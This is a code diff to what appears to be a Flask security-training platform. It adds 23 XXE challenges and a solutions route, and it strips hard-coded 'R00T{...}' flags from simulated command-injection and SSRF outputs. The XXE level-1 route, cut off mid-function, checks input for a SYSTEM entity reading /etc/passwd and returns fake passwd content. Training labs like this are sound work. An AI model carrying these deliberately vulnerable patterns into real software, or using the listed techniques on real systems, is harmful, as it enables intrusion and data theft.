@@ -13,6 +13,8 @@ import argparse
 import shutil
 import subprocess
 from datetime import datetime
+import xml.etree.ElementTree as ET
+import xml.parsers.expat
 
 
 
@@ -339,6 +341,54 @@ def reset_database():
                      description="Exploit command injection in SSH command execution.", points=2200),
             Challenge(name="Advanced Command Injection Chaining", category="cmdi", difficulty="expert",
                      description="Chain multiple command injection techniques for maximum impact.", points=2300),
+
+            # XML External Entity (XXE) Injection Challenges
+            Challenge(name="Basic XXE File Disclosure", category="xxe", difficulty="beginner",
+                     description="Exploit a basic XXE vulnerability to read local files.", points=100),
+            Challenge(name="XXE with DOCTYPE Restrictions", category="xxe", difficulty="beginner",
+                     description="Bypass basic DOCTYPE restrictions in XXE attacks.", points=200),
+            Challenge(name="XXE SYSTEM Entity Exploitation", category="xxe", difficulty="beginner",
+                     description="Use SYSTEM entities to access forbidden files.", points=300),
+            Challenge(name="XXE Internal Network Scanning", category="xxe", difficulty="intermediate",
+                     description="Use XXE to scan internal network services.", points=400),
+            Challenge(name="XXE Data Exfiltration via HTTP", category="xxe", difficulty="intermediate",
+                     description="Exfiltrate sensitive data using HTTP-based XXE.", points=500),
+            Challenge(name="XXE with Parameter Entities", category="xxe", difficulty="intermediate",
+                     description="Exploit XXE using parameter entities for advanced attacks.", points=600),
+            Challenge(name="Blind XXE via Error Messages", category="xxe", difficulty="intermediate",
+                     description="Exploit blind XXE vulnerabilities through error-based techniques.", points=700),
+            Challenge(name="XXE with CDATA Injection", category="xxe", difficulty="intermediate",
+                     description="Use CDATA sections to bypass XXE filters.", points=800),
+            Challenge(name="XXE via SVG File Upload", category="xxe", difficulty="advanced",
+                     description="Exploit XXE through malicious SVG file uploads.", points=900),
+            Challenge(name="XXE with XInclude Attacks", category="xxe", difficulty="advanced",
+                     description="Perform XXE attacks using XInclude directives.", points=1000),
+            Challenge(name="XXE Billion Laughs DoS", category="xxe", difficulty="advanced",
+                     description="Perform denial of service attacks through entity expansion.", points=1100),
+            Challenge(name="XXE SSRF Combination Attack", category="xxe", difficulty="advanced",
+                     description="Combine XXE with SSRF for advanced exploitation.", points=1200),
+            Challenge(name="XXE with WAF Bypass Techniques", category="xxe", difficulty="advanced",
+                     description="Bypass Web Application Firewalls to exploit XXE.", points=1300),
+            Challenge(name="XXE via SOAP Web Services", category="xxe", difficulty="expert",
+                     description="Exploit XXE vulnerabilities in SOAP-based web services.", points=1400),
+            Challenge(name="Advanced XXE with OOB Data Retrieval", category="xxe", difficulty="expert",
+                     description="Use out-of-band techniques for XXE data exfiltration.", points=1500),
+            Challenge(name="XXE in JSON-XML Conversion", category="xxe", difficulty="expert",
+                     description="Exploit XXE in applications that convert JSON to XML.", points=1600),
+            Challenge(name="XXE with Custom Entity Resolvers", category="xxe", difficulty="expert",
+                     description="Bypass custom entity resolvers and security controls.", points=1700),
+            Challenge(name="XXE in Microsoft Office Documents", category="xxe", difficulty="expert",
+                     description="Exploit XXE vulnerabilities in Office document processing.", points=1800),
+            Challenge(name="XXE with Protocol Handler Exploitation", category="xxe", difficulty="expert",
+                     description="Exploit various protocol handlers through XXE attacks.", points=1900),
+            Challenge(name="XXE in XML Signature Verification", category="xxe", difficulty="expert",
+                     description="Exploit XXE in XML digital signature verification processes.", points=2000),
+            Challenge(name="XXE with Time-Based Blind Techniques", category="xxe", difficulty="expert",
+                     description="Use time-based techniques for blind XXE exploitation.", points=2100),
+            Challenge(name="XXE in Cloud XML Processing", category="xxe", difficulty="expert",
+                     description="Exploit XXE vulnerabilities in cloud-based XML processing services.", points=2200),
+            Challenge(name="Advanced XXE Attack Chaining", category="xxe", difficulty="expert",
+                     description="Chain multiple XXE techniques for maximum exploitation impact.", points=2300),
 
             # Server-Side Request Forgery (SSRF) Challenges
             Challenge(name="Basic SSRF", category="ssrf", difficulty="beginner",
@@ -792,13 +842,32 @@ def index():
 # Vulnerabilities selection page with categories
 @app.route('/challenges')
 def vulnerabilities():
-    # Get all unique categories
-    categories = db.session.query(Challenge.category).distinct().all()
-    categories = [c[0] for c in categories]
+    # Get all unique categories and order them properly
+    categories_from_db = db.session.query(Challenge.category).distinct().all()
+    all_categories = [c[0] for c in categories_from_db]
 
     # Remove 'SQL Injection' category if it exists (we only want 'sqli')
-    if 'SQL Injection' in categories:
-        categories.remove('SQL Injection')
+    if 'SQL Injection' in all_categories:
+        all_categories.remove('SQL Injection')
+
+    # Define the correct order for security training progression
+    category_order = ['xss', 'sqli', 'cmdi', 'csrf', 'ssrf', 'xxe']
+    
+    # Sort categories in the specified order
+    categories = []
+    for category in category_order:
+        if category in all_categories:
+            categories.append(category)
+
+    # Define category display names
+    category_display_names = {
+        'xss': 'Cross-Site Scripting (XSS)',
+        'sqli': 'SQL Injection (SQLi)',
+        'cmdi': 'Command Injection (CMDi)',
+        'csrf': 'Cross-Site Request Forgery (CSRF)',
+        'ssrf': 'Server-Side Request Forgery (SSRF)',
+        'xxe': 'XML External Entity (XXE)'
+    }
 
     # Get the current user and their completed challenges
     user = get_local_user()
@@ -837,6 +906,7 @@ def vulnerabilities():
         categories=categories,
         challenges_by_category=challenges_by_category,
         category_completion=category_completion,
+        category_display_names=category_display_names,
         total_count=total_count,
         completed_count=completed_count
     )
@@ -4472,6 +4542,46 @@ def solutions(level):
             level_num = level  # Use the full level string
 
         return render_template(f'solutions/sqli_level{level_num}_solution.html', challenge=challenge)
+    
+    # Check if it's an XXE solution
+    elif level.startswith('xxe'):
+        # Get the challenge object to pass to the template
+        challenge_name_map = {
+            'xxe1': 'Basic XXE File Disclosure',
+            'xxe2': 'XXE with DOCTYPE Restrictions',
+            'xxe3': 'XXE SYSTEM Entity Exploitation',
+            'xxe4': 'XXE Internal Network Scanning',
+            'xxe5': 'XXE Data Exfiltration via HTTP',
+            'xxe6': 'XXE with Parameter Entities',
+            'xxe7': 'Blind XXE via Error Messages',
+            'xxe8': 'XXE with CDATA Injection',
+            'xxe9': 'XXE via SVG File Upload',
+            'xxe10': 'XXE with XInclude Attacks',
+            'xxe11': 'XXE Billion Laughs DoS',
+            'xxe12': 'XXE SSRF Combination Attack',
+            'xxe13': 'XXE with WAF Bypass Techniques',
+            'xxe14': 'XXE via SOAP Web Services',
+            'xxe15': 'Advanced XXE with OOB Data Retrieval',
+            'xxe16': 'XXE in JSON-XML Conversion',
+            'xxe17': 'XXE with Custom Entity Resolvers',
+            'xxe18': 'XXE in Microsoft Office Documents',
+            'xxe19': 'XXE with Protocol Handler Exploitation',
+            'xxe20': 'XXE in XML Signature Verification',
+            'xxe21': 'XXE with Time-Based Blind Techniques',
+            'xxe22': 'XXE in Cloud XML Processing',
+            'xxe23': 'Advanced XXE Attack Chaining'
+        }
+        challenge_name = challenge_name_map.get(level)
+        challenge = Challenge.query.filter_by(name=challenge_name).first() if challenge_name else None
+
+        # Extract level number, handling both single and double-digit levels
+        if level.startswith('xxe'):
+            level_num = level[3:]  # Extract everything after 'xxe'
+        else:
+            level_num = level  # Use the full level string
+
+        return render_template(f'solutions/xxe_level{level_num}_solution.html', challenge=challenge)
+    
     # Check if it's a CSRF solution
     elif level.startswith('csrf'):
         # Get the challenge object to pass to the template
@@ -4577,10 +4687,8 @@ def cmdi_level1():
                     if 'whoami' in hostname:
                         ping_result += "Command injection detected!\n"
                         ping_result += "Current user: www-data\n"
-                        ping_result += "Flag: R00T{b4s1c_cmd1_1nj3ct10n_pwn3d}\n"
                     elif 'id' in hostname:
                         ping_result += "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
-                        ping_result += "Flag: R00T{b4s1c_cmd1_1nj3ct10n_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Basic Command Injection").first()
@@ -4641,7 +4749,6 @@ def cmdi_level2():
                     if 'whoami' in command or 'id' in command:
                         output += "\nUnexpected output detected:\n"
                         output += "root\n"
-                        output += "Flag: R00T{f1lt3r_byp4ss_cmd1_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection with Filters").first()
@@ -4731,7 +4838,6 @@ def cmdi_level4():
                     if 'whoami' in filename:
                         upload_result += "Post-processing output:\n"
                         upload_result += "Current user: apache\n"
-                        upload_result += "Flag: R00T{f1l3_upl04d_cmd1_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection via File Upload").first()
@@ -4780,7 +4886,6 @@ def cmdi_level5():
                     if 'env' in service_name or 'printenv' in service_name:
                         api_result += "Environment variables:\n"
                         api_result += "PATH=/usr/local/sbin:/usr/local/bin\n"
-                        api_result += "FLAG=R00T{4p1_cmd1_1nj3ct10n_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection in API Parameters").first()
@@ -4842,7 +4947,6 @@ def cmdi_level6():
                         if 'w' in target and 'h' in target:  # Obfuscated whoami
                             scan_result += "System information:\n"
                             scan_result += "Current user: scanner\n"
-                            scan_result += "Flag: R00T{w4f_byp4ss_cmd1_pwn3d}\n"
 
                         # Mark challenge as completed
                         challenge = Challenge.query.filter_by(name="Command Injection with WAF Bypass").first()
@@ -4972,7 +5076,6 @@ def cmdi_level8():
                         management_result += "System processes:\n"
                         management_result += "PID  COMMAND\n"
                         management_result += "1    /sbin/init\n"
-                        management_result += "Flag: R00T{burp_su1t3_cmd1_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection with Burp Suite").first()
@@ -5027,7 +5130,6 @@ def cmdi_level9():
                                 if 'uname' in value:
                                     build_result += "Build system info:\n"
                                     build_result += "Linux buildserver 5.4.0-74-generic\n"
-                                    build_result += "Flag: R00T{j50n_4p1_cmd1_pwn3d}\n"
 
                                 # Mark challenge as completed
                                 challenge = Challenge.query.filter_by(name="Command Injection in JSON APIs").first()
@@ -5084,7 +5186,6 @@ def cmdi_level10():
                     if 'whoami' in env_vars or 'id' in env_vars:
                         deploy_result += "Container initialization output:\n"
                         deploy_result += "User: container-user\n"
-                        deploy_result += "Flag: R00T{3nv_v4r5_cmd1_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection via Environment Variables").first()
@@ -5134,7 +5235,6 @@ def cmdi_level11():
                     if 'whoami' in xml_config or 'id' in xml_config:
                         processing_result += "Service management output:\n"
                         processing_result += "Current system user: enterprise-admin\n"
-                        processing_result += "Flag: R00T{xml_pr0c3ss1ng_cmd1_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection in XML Processing").first()
@@ -5189,7 +5289,6 @@ def cmdi_level12():
                     if 'uname' in target_network or 'uname' in scan_options:
                         nmap_result += "System information leaked:\n"
                         nmap_result += "Linux security-scanner 5.15.0-72-generic\n"
-                        nmap_result += "Flag: R00T{nm4p_1nt3gr4t10n_cmd1_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection with Nmap").first()
@@ -5242,8 +5341,7 @@ def cmdi_level13():
                     if 'whoami' in graphql_query:
                         query_result += '    },\n'
                         query_result += '    "debug": {\n'
-                        query_result += '      "user": "graphql-api",\n'
-                        query_result += '      "flag": "R00T{gr4phql_cmd1_1nj3ct10n_pwn3d}"\n'
+                        query_result += '      "user": "graphql-api"\n'
                         query_result += '    }\n'
                     else:
                         query_result += '    }\n'
@@ -5311,7 +5409,6 @@ def cmdi_level14():
                                     monitoring_result += "System monitoring data:\n"
                                     monitoring_result += "Active connections: 42\n"
                                     monitoring_result += "System load: 0.8\n"
-                                    monitoring_result += "Flag: R00T{w3bs0ck3t_cmd1_pwn3d}\n"
 
                                 # Mark challenge as completed
                                 challenge = Challenge.query.filter_by(name="Command Injection via WebSockets").first()
@@ -5435,7 +5532,6 @@ def cmdi_level16():
                         execution_result += "Process substitution executed:\n"
                         execution_result += "Current user: automation-runner\n"
                         execution_result += "Process ID: 12345\n"
-                        execution_result += "Flag: R00T{pr0c3ss_subst1tut10n_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection with Process Substitution").first()
@@ -5490,12 +5586,10 @@ def cmdi_level17():
                         docker_result += "Container escape detected:\n"
                         docker_result += "Host filesystem access gained\n"
                         docker_result += "Host kernel: Linux docker-host 5.15.0\n"
-                        docker_result += "Flag: R00T{c0nt41n3r_3sc4p3_pwn3d}\n"
                     elif 'whoami' in container_cmd:
                         docker_result += "Container execution output:\n"
                         docker_result += "Container user: root\n"
                         docker_result += "Container ID: c4f3d2a1b5e6\n"
-                        docker_result += "Flag: R00T{c0nt41n3r_3sc4p3_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection in Container Environments").first()
@@ -5556,11 +5650,9 @@ def cmdi_level18():
                         report_result += "Template injection executed:\n"
                         report_result += "System access gained through template engine\n"
                         report_result += "Current working directory: /app/reports\n"
-                        report_result += "Flag: R00T{t3mpl4t3_1nj3ct10n_pwn3d}\n"
                     elif any('whoami' in str(value) for value in data.values()):
                         report_result += "Command injection in template data:\n"
                         report_result += "Template user: report-generator\n"
-                        report_result += "Flag: R00T{t3mpl4t3_1nj3ct10n_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection via Template Engines").first()
@@ -5622,7 +5714,6 @@ def cmdi_level19():
                                     processing_result += "Worker system information:\n"
                                     processing_result += "Worker hostname: task-worker-03\n"
                                     processing_result += "Worker OS: Linux 5.15.0-72-generic\n"
-                                    processing_result += "Flag: R00T{m3ss4g3_qu3u3_pwn3d}\n"
 
                                 # Mark challenge as completed
                                 challenge = Challenge.query.filter_by(name="Command Injection in Message Queues").first()
@@ -5685,7 +5776,6 @@ def cmdi_level20():
                     config_result += "Out-of-band communication detected:\n"
                     config_result += "External connection established\n"
                     config_result += "Data exfiltration in progress...\n"
-                    config_result += "Flag: R00T{0ut_0f_b4nd_cmd1_pwn3d}\n"
 
                 # Mark challenge as completed
                 challenge = Challenge.query.filter_by(name="Command Injection with Out-of-Band").first()
@@ -5741,7 +5831,6 @@ def cmdi_level21():
                         cloud_result += "Function execution output:\n"
                         cloud_result += "Cloud environment: Google Cloud Platform\n"
                         cloud_result += "Service account: cloud-function-sa@project.iam\n"
-                        cloud_result += "Flag: R00T{cl0ud_funct10n_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection in Cloud Functions").first()
@@ -5797,7 +5886,6 @@ def cmdi_level22():
                         ssh_result += "Remote user: deploy-user\n"
                         ssh_result += "Remote host: production-server-01\n"
                         ssh_result += "SSH session: pts/2\n"
-                        ssh_result += "Flag: R00T{ssh_cmd_1nj3ct10n_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Command Injection via SSH Commands").first()
@@ -5875,7 +5963,6 @@ def cmdi_level23():
                     deployment_result += "Infrastructure compromise achieved:\n"
                     deployment_result += "Access level: Enterprise administrator\n"
                     deployment_result += "Scope: Multi-cloud infrastructure\n"
-                    deployment_result += "Flag: R00T{4dv4nc3d_ch41n1ng_m4st3r_pwn3d}\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Advanced Command Injection Chaining").first()
@@ -5930,12 +6017,12 @@ def ssrf_level1():
                         fetch_result += "Content-Type: text/html\n\n"
                         fetch_result += "<h1>Internal Admin Panel</h1>\n"
                         fetch_result += "<p>Welcome to the internal administration interface</p>\n"
-                        fetch_result += "<p>Flag: R00T{b4s1c_ssrf_l0c4lh0st_pwn3d}</p>\n"
+                        fetch_result += "<p>Internal system access successful</p>\n"
                     elif '192.168.' in url or '10.' in url:
                         fetch_result += "HTTP/1.1 200 OK\n"
                         fetch_result += "Server: nginx/1.18.0\n"
                         fetch_result += "Content-Type: application/json\n\n"
-                        fetch_result += '{"status": "success", "message": "Internal API accessed", "flag": "R00T{b4s1c_ssrf_1nt3rn4l_n3tw0rk}"}\n'
+                        fetch_result += '{"status": "success", "message": "Internal API accessed", "data": "sensitive_internal_info"}\n'
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Basic SSRF").first()
@@ -5988,20 +6075,20 @@ def ssrf_level2():
                     if ':22' in target_url:
                         scan_result += "Port 22 (SSH): Open\n"
                         scan_result += "Service: OpenSSH 8.2\n"
-                        scan_result += "Flag: R00T{ssrf_p0rt_sc4nn1ng_ssh_pwn3d}\n"
+                        scan_result += "SSH service detected successfully\n"
                     elif ':80' in target_url or ':8080' in target_url:
                         scan_result += "Port 80/8080 (HTTP): Open\n"
                         scan_result += "Service: Internal Web Server\n"
                         scan_result += "Response: Internal API Documentation\n"
-                        scan_result += "Flag: R00T{ssrf_1nt3rn4l_w3b_s3rv3r_pwn3d}\n"
+                        scan_result += "Web server access granted\n"
                     elif ':3306' in target_url:
                         scan_result += "Port 3306 (MySQL): Open\n"
                         scan_result += "Service: MySQL Database\n"
-                        scan_result += "Flag: R00T{ssrf_d4t4b4s3_d1sc0v3ry_pwn3d}\n"
+                        scan_result += "Database service discovered\n"
                     else:
                         scan_result += "Internal service discovered!\n"
                         scan_result += "Network scan successful\n"
-                        scan_result += "Flag: R00T{ssrf_n3tw0rk_sc4nn1ng_pwn3d}\n"
+                        scan_result += "Internal network enumeration completed\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="SSRF with Internal Network Scanning").first()
@@ -6058,7 +6145,7 @@ def ssrf_level3():
                         metadata_result += '    "Token": "..."\n'
                         metadata_result += "  }\n"
                         metadata_result += "}\n"
-                        metadata_result += "Flag: R00T{ssrf_4ws_m3t4d4t4_pwn3d}\n"
+                        metadata_result += "AWS metadata access successful\n"
                     elif 'metadata.google.internal' in webhook_url:
                         metadata_result += "GCP Metadata Service Response:\n"
                         metadata_result += "{\n"
@@ -6069,7 +6156,7 @@ def ssrf_level3():
                         metadata_result += "    }\n"
                         metadata_result += "  }\n"
                         metadata_result += "}\n"
-                        metadata_result += "Flag: R00T{ssrf_gcp_m3t4d4t4_pwn3d}\n"
+                        metadata_result += "GCP metadata access successful\n"
                     elif 'metadata.azure.com' in webhook_url:
                         metadata_result += "Azure Metadata Service Response:\n"
                         metadata_result += "{\n"
@@ -6079,7 +6166,7 @@ def ssrf_level3():
                         metadata_result += "  },\n"
                         metadata_result += '  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik..."\n'
                         metadata_result += "}\n"
-                        metadata_result += "Flag: R00T{ssrf_4zur3_m3t4d4t4_pwn3d}\n"
+                        metadata_result += "Azure metadata access successful\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Cloud Metadata SSRF").first()
@@ -6130,7 +6217,7 @@ def ssrf_level4():
                     dns_result += "Type: A\n"
                     dns_result += "Source: Internal PDF Service\n"
                     dns_result += "Status: DNS exfiltration successful!\n"
-                    dns_result += "Flag: R00T{bl1nd_ssrf_dns_3xf1ltr4t10n_pwn3d}\n"
+                    dns_result += "Blind SSRF exploitation confirmed\n"
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="Blind SSRF with DNS Exfiltration").first()
@@ -6192,7 +6279,7 @@ def ssrf_level5():
                         filter_result += "Internal Service Response:\n"
                         filter_result += "HTTP/1.1 200 OK\n"
                         filter_result += "Content-Type: application/json\n\n"
-                        filter_result += '{"message": "Internal admin API", "flag": "R00T{ssrf_f1lt3r_byp4ss_pwn3d}"}\n'
+                        filter_result += '{"message": "Internal admin API", "status": "access_granted"}\n'
 
                         # Mark challenge as completed
                         challenge = Challenge.query.filter_by(name="SSRF with Basic Filters").first()
@@ -6249,7 +6336,7 @@ def ssrf_level6():
                             upload_result += "Internal Service Response:\n"
                             upload_result += "HTTP/1.1 200 OK\n"
                             upload_result += "Content-Type: application/json\n\n"
-                            upload_result += '{"message": "Internal file server", "flag": "R00T{ssrf_svg_f1l3_upl04d_pwn3d}"}\n'
+                            upload_result += '{"message": "Internal file server", "access": "granted"}\n'
 
                             # Mark challenge as completed
                             challenge = Challenge.query.filter_by(name="SSRF via File Upload").first()
@@ -6303,7 +6390,7 @@ def ssrf_level7():
                     webhook_result += "Webhook Response:\n"
                     webhook_result += "HTTP/1.1 200 OK\n"
                     webhook_result += "Content-Type: application/json\n\n"
-                    webhook_result += '{"status": "received", "internal_api": true, "flag": "R00T{ssrf_w3bh00k_1nt3rn4l_pwn3d}"}\n'
+                    webhook_result += '{"status": "received", "internal_api": true, "access": "successful"}\n'
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="SSRF in Webhooks").first()
@@ -6360,7 +6447,7 @@ def ssrf_level8():
                         waf_result += "Internal Service Response:\n"
                         waf_result += "HTTP/1.1 200 OK\n"
                         waf_result += "Content-Type: application/json\n\n"
-                        waf_result += '{"message": "Internal admin panel", "flag": "R00T{ssrf_w4f_byp4ss_4dv4nc3d_pwn3d}"}\n'
+                        waf_result += '{"message": "Internal admin panel", "access": "waf_bypassed"}\n'
 
                         # Mark challenge as completed
                         challenge = Challenge.query.filter_by(name="SSRF with WAF Bypass").first()
@@ -6417,16 +6504,16 @@ def ssrf_level9():
                                 xxe_result += "File System Access:\n"
                                 xxe_result += "/etc/passwd:\n"
                                 xxe_result += "root:x:0:0:root:/root:/bin/bash\n"
-                                xxe_result += "Flag: R00T{xxe_t0_ssrf_f1l3_r34d_pwn3d}\n"
+                                xxe_result += "File system access successful\n"
                             elif 'gopher://' in system_url:
                                 xxe_result += "Gopher Protocol SSRF:\n"
                                 xxe_result += "Internal service accessed via Gopher\n"
-                                xxe_result += "Flag: R00T{xxe_t0_ssrf_g0ph3r_pwn3d}\n"
+                                xxe_result += "Gopher protocol exploitation successful\n"
                             else:
                                 xxe_result += "Internal Service Response:\n"
                                 xxe_result += "HTTP/1.1 200 OK\n"
                                 xxe_result += "Content-Type: application/json\n\n"
-                                xxe_result += '{"message": "Internal API via XXE", "flag": "R00T{xxe_t0_ssrf_1nt3rn4l_pwn3d}"}\n'
+                                xxe_result += '{"message": "Internal API via XXE", "access": "granted"}\n'
 
                             # Mark challenge as completed
                             challenge = Challenge.query.filter_by(name="SSRF via XXE").first()
@@ -6482,7 +6569,7 @@ def ssrf_level10():
                     rebinding_result += "Internal Service Response:\n"
                     rebinding_result += "HTTP/1.1 200 OK\n"
                     rebinding_result += "Content-Type: application/json\n\n"
-                    rebinding_result += '{"message": "Internal admin interface", "rebinding": true, "flag": "R00T{dns_r3b1nd1ng_ssrf_pwn3d}"}\n'
+                    rebinding_result += '{"message": "Internal admin interface", "rebinding": true, "access": "granted"}\n'
 
                     # Mark challenge as completed
                     challenge = Challenge.query.filter_by(name="SSRF with DNS Rebinding").first()
@@ -6537,7 +6624,7 @@ def ssrf_level11():
                             graphql_result += "{\n"
                             graphql_result += '  "data": {\n'
                             graphql_result += '    "internal": true,\n'
-                            graphql_result += '    "flag": "R00T{gr4phql_ssrf_1ntr0sp3ct10n_pwn3d}"\n'
+                            graphql_result += '    "access": "internal_granted"\n'
                             graphql_result += "  }\n"
                             graphql_result += "}\n"
 
@@ -6595,7 +6682,7 @@ def ssrf_level12():
                         redis_result += "Redis Server Response:\n"
                         redis_result += "+OK\n"
                         redis_result += "$64\n"
-                        redis_result += "R00T{g0ph3r_r3d1s_ssrf_pr0t0c0l_pwn3d}\n"
+                        redis_result += "Internal_Redis_Access_Successful\n"
 
                         # Mark challenge as completed
                         challenge = Challenge.query.filter_by(name="SSRF via Redis Protocol").first()
@@ -6654,7 +6741,7 @@ Internal WebSocket Service Response:
   "service": "internal-websocket-gateway",
   "status": "connected",
   "internal_data": "sensitive_websocket_data",
-  "flag": "R00T{{w3bs0ck3t_ssrf_upr4d3_pwn3d}}"
+  "access": "websocket_ssrf_successful"
 }}"""
 
                 challenge = Challenge.query.filter_by(name="SSRF in WebSocket Upgrade").first()
@@ -6733,7 +6820,7 @@ Internal SMTP Data Leaked:
   "smtp_server": "internal-mail.company.local",
   "valid_users": ["admin", "root", "postmaster"],
   "internal_domains": ["company.local", "internal.local"],
-  "flag": "R00T{{smtp_g0ph3r_pr0t0c0l_pwn3d}}"
+  "access": "smtp_internal_enumeration_successful"
 }}"""
 
                 challenge = Challenge.query.filter_by(name="SSRF via SMTP Protocol").first()
@@ -6799,7 +6886,7 @@ Internal OAuth Service Response:
   "internal_data": {{
     "user_id": "admin",
     "internal_services": ["user-api", "admin-panel", "billing-service"],
-    "flag": "R00T{{0auth_c4llb4ck_ssrf_pwn3d}}"
+    "access": "oauth_internal_token_granted"
   }}
 }}"""
 
@@ -6877,7 +6964,7 @@ Internal LDAP Data:
   "base_dn": "dc=internal,dc=local",
   "admin_users": ["admin", "ldapadmin", "service-account"],
   "internal_groups": ["Domain Admins", "Service Accounts"],
-  "flag": "R00T{{ldap_1nj3ct10n_ssrf_pwn3d}}"
+  "access": "ldap_internal_directory_enumerated"
 }}"""
 
                 challenge = Challenge.query.filter_by(name="SSRF via LDAP Protocol").first()
@@ -6961,7 +7048,7 @@ Docker Daemon API Response:
     "Env": [
       "DATABASE_URL=postgresql://admin:secret@db.internal.local:5432/app",
       "API_KEY=sk-1234567890abcdef",
-      "INTERNAL_FLAG=R00T{{c0nt41n3r_m3t4d4t4_ssrf_pwn3d}}"
+      "INTERNAL_SECRET=container_metadata_exposed"
     ]
   }}
 }}"""
@@ -7035,7 +7122,7 @@ LIST
 
 RETR flag.txt
 150 Opening BINARY mode data connection for flag.txt (512 bytes)
-R00T{{ftp_p4ss1v3_m0d3_ssrf_pwn3d}}
+Internal_FTP_Access_Successful
 226 Transfer complete
 
 Internal FTP Data:
@@ -7043,7 +7130,7 @@ Internal FTP Data:
   "ftp_server": "internal-ftp.company.local",
   "accessible_paths": ["/sensitive", "/config", "/backups"],
   "internal_files": ["database_backup.sql", "api_keys.txt", "user_data.csv"],
-  "flag": "R00T{{ftp_p4ss1v3_m0d3_ssrf_pwn3d}}"
+  "flag": "Internal_FTP_Access_Successful"
 }}"""
 
                 challenge = Challenge.query.filter_by(name="SSRF via FTP Protocol").first()
@@ -7120,7 +7207,7 @@ X-Service-Version: 2.1.0
     "envoy_config": "/etc/envoy/envoy.yaml",
     "internal_services": ["billing-api", "notification-service", "audit-service"]
   }},
-  "flag": "R00T{{ap1_g4t3w4y_r0ut1ng_pwn3d}}"
+  "access": "api_gateway_internal_routing_successful"
 }}"""
 
                 challenge = Challenge.query.filter_by(name="SSRF in API Gateway").first()
@@ -7194,7 +7281,7 @@ Internal Service Fingerprint:
   "estimated_timeout": "3000ms",
   "service_status": "running",
   "internal_network": "10.0.0.0/8",
-  "flag": "R00T{{t1m1ng_b4s3d_bl1nd_ssrf_pwn3d}}"
+  "access": "timing_based_ssrf_detection_successful"
 }}"""
 
                 challenge = Challenge.query.filter_by(name="SSRF via Time-based Attacks").first()
@@ -7294,7 +7381,7 @@ Istio Service Mesh Response:
     "total_services": 23,
     "critical_services": ["auth-service", "payment-service", "admin-panel"],
     "service_mesh_version": "istio-1.18.0",
-    "flag": "R00T{{m1cr0s3rv1c3s_m3sh_pwn3d}}"
+    "access": "microservices_mesh_enumeration_successful"
   }}
 }}"""
 
@@ -7384,7 +7471,7 @@ X-Bypass-Filters: protocol-smuggling
       "network": "10.0.0.0/8",
       "services": ["redis", "postgresql", "elasticsearch"]
     }},
-    "flag": "R00T{{pr0t0c0l_smuggl1ng_byp4ss_pwn3d}}"
+    "access": "protocol_smuggling_bypass_successful"
   }}
 }}"""
 
@@ -7492,7 +7579,7 @@ Internal Serverless Data:
     "API_GATEWAY_KEY": "sk-lambda-internal-12345",
     "S3_BUCKET": "internal-lambda-data-bucket"
   }},
-  "flag": "R00T{{s3rv3rl3ss_cl0ud_m3t4d4t4_pwn3d}}"
+  "access": "serverless_cloud_metadata_access_successful"
 }}"""
 
                 challenge = Challenge.query.filter_by(name="SSRF in Serverless Functions").first()
@@ -7520,6 +7607,1536 @@ Try targeting cloud metadata services."""
     return render_template('ssrf/ssrf_level23.html', flag=flag, ssrf_detected=ssrf_detected,
                           function_url=function_url, cloud_metadata=cloud_metadata,
                           serverless_result=serverless_result, challenge=challenge)
+
+
+# ===== XXE CHALLENGE ROUTES =====
+
+# XXE Level 1 - Basic XXE File Disclosure
+@app.route('/xxe/level1', methods=['GET', 'POST'])
+def xxe_level1():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    file_content = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Parse XML with external entity processing enabled (vulnerable)
+                parser = ET.XMLParser()
+                
+                # Check for external entity references
+                if '<!ENTITY' in xml_content and 'SYSTEM' in xml_content and '/etc/passwd' in xml_content:
+                    xxe_detected = True
+                    
+                    # Simulate reading /etc/passwd
+                    file_content = """root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash"""
+                
+                # Try to parse the XML
+                try:
